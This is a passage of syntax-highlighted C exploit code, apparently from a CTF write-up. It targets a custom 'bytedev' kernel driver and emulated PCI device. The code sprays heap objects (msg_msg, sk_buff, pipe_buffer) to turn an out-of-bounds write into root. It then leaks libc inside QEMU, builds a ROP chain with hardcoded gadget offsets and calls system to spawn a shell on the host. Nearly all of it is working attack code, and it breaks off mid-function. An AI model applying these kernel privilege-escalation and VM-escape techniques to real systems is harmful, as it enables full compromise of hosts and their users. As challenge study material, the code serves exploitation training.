class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff81e2d980</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810bb9c04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff8224aca0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810bb710</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff811af57d</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_MODE_CHANGE 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BLK_IDX_CHANGE 0x1919810</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_SYSTEM 0x50d60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RSP_RDX_RET 0x5a170</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_POP_RDI_RET 0x2a3e5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_RET 0x2a3e6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_BIN_SH 0x1d8698</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_PUTS 0x80ed0</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BYTEDEV_MODE</span> &#123;</span><br>    BYTEDEV_MODE_STREAM = <span class="hljs-number">0</span>,<br>    BYTEDEV_MODE_BLK,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>  &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; secondary_msg;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_second_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) \<br>                + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">int</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-type">int</span> socket_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">fake_data</span>;</span><br>    <span class="hljs-type">char</span> *trash_data;<br><br>    <span class="hljs-comment">/* free the first buffer in bytedev queue */</span><br>    trash_data = <span class="hljs-built_in">malloc</span>(BYTEDEV_BUF_SIZE);<br>    <span class="hljs-built_in">memset</span>(trash_data, <span class="hljs-number">0x84</span>, BYTEDEV_BUF_SIZE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write %ld bytes to dev \n&quot;</span>, <br>            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read %ld bytes from dev\n&quot;</span>, <br>            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br><br>    <span class="hljs-comment">/* construct fake bytedev_data */</span><br>    fake_data = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data) + BYTEDEV_BUF_SIZE);<br>    fake_data-&gt;len = BYTEDEV_BUF_SIZE + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] re-get the buffer by sk_buff...&quot;</span>);<br>    write(socket_fd[<span class="hljs-number">0</span>], fake_data, BYTEDEV_BUF_SIZE - <span class="hljs-number">320</span>);<br><br>    <span class="hljs-comment">/* make an OOB write */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB write to nearby object...&quot;</span>);<br>    write(dev_fd, trash_data, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* to prevent the memory leaking */</span><br>    <span class="hljs-built_in">free</span>(trash_data);<br>    <span class="hljs-built_in">free</span>(fake_data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemuEscape</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd, ret;<br>    <span class="hljs-type">uint64_t</span> buf[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> fake_ops[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> libc_base, opaque, byte_dev_pmio_read;<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SECTOR -23: container</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> in docker-built Ubuntu 22.04, we cannot leak libc there.</span><br><span class="hljs-comment">     *      [55] g_str_hash</span><br><span class="hljs-comment">     *      [56] g_str_equal</span><br><span class="hljs-comment">     * SECTOR -24: BYTEPCIDevState</span><br><span class="hljs-comment">     *      [27~34] name</span><br><span class="hljs-comment">     *      [35~] io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     * SECTOR -25: byte_dev_pmio_ops</span><br><span class="hljs-comment">     *      [0] byte_dev_pmio_read</span><br><span class="hljs-comment">     *      [1] byte_dev_pmio_write</span><br><span class="hljs-comment">     * SECTOR -355 &amp;io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     *      SECTOR -352 MemoryRegion - mmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     *      SECTOR -347 MemoryRegion - pmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     * SECTOR -388</span><br><span class="hljs-comment">     *      [8] &lt;g_str_hash&gt;</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I leak basic info</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I leak basic\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -388 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-388</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x7f0000000000</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>); i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--data-dump--][%d] %lx\n&quot;</span>, i, buf[i]);<br>        &#125;<br>        errExit(<span class="hljs-string">&quot;failed to leak libc related ptr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* This&#x27;s the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */</span><br>    libc_base = buf[<span class="hljs-number">7</span>] - <span class="hljs-number">0x3ea410</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n&quot;</span>, libc_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -25 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-25</span>);<br>    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);<br>    byte_dev_pmio_read = fake_ops[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n&quot;</span>, <br>            byte_dev_pmio_read);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -347 sector...\033[0m&quot;</span>);<br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>    opaque = buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got opaque: \033[0m%lx\n&quot;</span>, opaque);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II construct fake pmio-&gt;ops</span><br><span class="hljs-comment">     * There we make the opaque.parent_obj.name the ops,</span><br><span class="hljs-comment">     * so that nothing will be effects</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.II construct fake pmio-&gt;ops\033[0m&quot;</span>);<br>    <br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-24</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    buf[<span class="hljs-number">33</span>] = buf[<span class="hljs-number">34</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;buf[<span class="hljs-number">33</span>], <span class="hljs-string">&quot;ls;cat ./flag;gnome-calculator;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* the new rdx starts there */</span><br>    buf[<span class="hljs-number">28</span>] = libc_base + LIBC_POP_RDI_RET;<br>    buf[<span class="hljs-number">29</span>] = opaque + <span class="hljs-number">33</span> * <span class="hljs-number">8</span>;<span class="hljs-comment">//libc_base + LIBC_BIN_SH;</span><br>    buf[<span class="hljs-number">30</span>] = libc_base + LIBC_SYSTEM;<br>    <span class="hljs-comment">//buf[31] = </span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * [rdx + 20]</span><br><span class="hljs-comment">     * mov rsp, rdx ; ret</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">32</span>] = libc_base + LIBC_MOV_RSP_RDX_RET;<br><br>    <span class="hljs-comment">/* the [rdi + 8] */</span><br>    buf[<span class="hljs-number">1</span>] = opaque + <span class="hljs-number">28</span> * <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">/* fake ops on bar space */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        buf[<span class="hljs-number">50</span> + i] = fake_ops[i];<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * mov rdx, qword ptr [rdi + 8] ; -&gt; store the ptr in opaque[1]</span><br><span class="hljs-comment">     * mov qword ptr [rsp], rax ; </span><br><span class="hljs-comment">     * call qword ptr [rdx + 0x20]  -&gt; another call</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">51</span>] = <br>        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;<br><br>    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III change pmio-&gt;ops to fake ops on opaque</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III change pmio-&gt;ops to fake ops\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    buf[<span class="hljs-number">9</span>] = opaque + <span class="hljs-number">50</span> * <span class="hljs-number">8</span>;<br>    write(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV trigger fake pmio-&gt;ops.read to escape</span><br><span class="hljs-comment">     * There we need to set opaque[1] to opaque.parent_obj.name</span><br><span class="hljs-comment">     * and do something wonderful there...</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//sleep(5);</span><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid()) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n&quot;</span>);<br>    qemuEscape();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] trigerring root shell now...\033[0m\n&quot;</span>);<br>    